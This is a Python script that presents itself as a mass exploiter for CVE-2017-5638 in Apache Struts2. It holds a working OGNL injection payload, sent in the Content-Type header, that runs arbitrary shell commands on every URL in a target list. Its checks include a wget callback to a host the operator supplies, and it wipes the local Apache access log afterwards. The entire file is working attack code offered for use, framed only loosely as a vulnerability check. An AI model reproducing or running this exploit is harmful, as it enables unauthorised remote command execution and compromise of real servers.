#!/usr/bin/python

import urllib2
import httplib
import os
import SimpleHTTPServer
import SocketServer
import logging
import sys
import time

def exploit(url, cmd, write):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    #print(page)
    if(write == 1):
		f = open('Temp.txt', 'w')
		f.truncate()
		f.write(page)
		f.close()
    return 

def vulnerable(url,platform,ip):
	windows_cmd_list = ["ipconfig","ping"]
	linux_cmd_list = ["ifconfig","wget", "sleep"]
	default_cmd_list = ["ifconfig","ipconfig","wget","sleep","ping"]

	if (platform == 'windows'):
		cmd_list = windows_cmd_list
	elif (platform == 'linux'):
		cmd_list = linux_cmd_list
	elif (platform == 'default'):
		cmd_list = default_cmd_list
	else:
		print ("platform not supported")	

	for command in cmd_list:
		if (command == 'ipconfig'):
			exploit(url, command,1)
			check_string(url,command,"IPv4 Address")
		elif (command == 'ifconfig'):
			exploit(url, command,1)
			check_string(url,command,"inet")
		elif (command == "wget"):
			cmd ="wget http://"+ip+"/Struts_Check"
			exploit(url, cmd,0)
			check_blind_injection(url,cmd)
		elif (command == "ping"):
			# wait for 6 sec delay (-n 6 means 6 seconds delay)
			cmd ="ping 127.0.0.1 -n 6 >NUL 2>&1"
			check_time_blind_injection(url,cmd)
		elif (command == "sleep"):
			# wait for 6 sec delay (-n 6 means 6 seconds delay)
			cmd ="sleep 5"
			check_time_blind_injection(url,cmd)
		else:
			print "Command not recognized"
	os.remove('Temp.txt')	
	return 
# Check normal command injection where we can view the output
def check_string(url,cmd,match_string):
	with open('Temp.txt') as f:
    		content = f.read().splitlines()
		for line in content:
			if match_string in line:
				print (url," is vulnerable to command injection")
				break
	f.close()
	return
# For linux only - Check blind command injection we inject wget command and check apache logs for injection
def check_blind_injection(url,cmd):
	with open("/var/log/apache2/access.log") as f:
    		content = f.read().splitlines()
		for line in content:
			if "Struts_Check" in line:
				print (url," is vulnerable to blind command injection")
				f.close()
				break
	f = open('/var/log/apache2/access.log', 'w')
	f.truncate()
	f.close()
	return
#For windows - Check time blind command injection we inject delay using 'ping' command and wait for result
#For linux - Check time blind command injection we inject delay using 'sleep' command and wait for result

def check_time_blind_injection(url,cmd):
	start_time = time.time()
	exploit(url,cmd,0)
	end_time = time.time()
	delay = end_time - start_time
	if (delay >5 ):
		print (url," is vulnerable to time based blind command injection")
	return

if __name__ == '__main__':
    
    if len(sys.argv) != 4:
        print("[*] python strutsy.py <urls.txt> <windows/linux/default> <ip-address>")
    else:
        print('CVE: 2017-5638 - Apache Struts2 Mass Exploiter by @tahmed')
        filename = sys.argv[1]
	platform = sys.argv[2]
	ip = sys.argv[3]
	if not (platform == "windows" or platform == "linux" or platform == "default"):
		print ("struts.py <urls.txt> <windows/linux/default> <ip-address>")		

	with open(filename) as f:
    		content = f.read().splitlines()
		for line in content:
			try:
				vulnerable(line,platform,ip)				
			except:
				pass
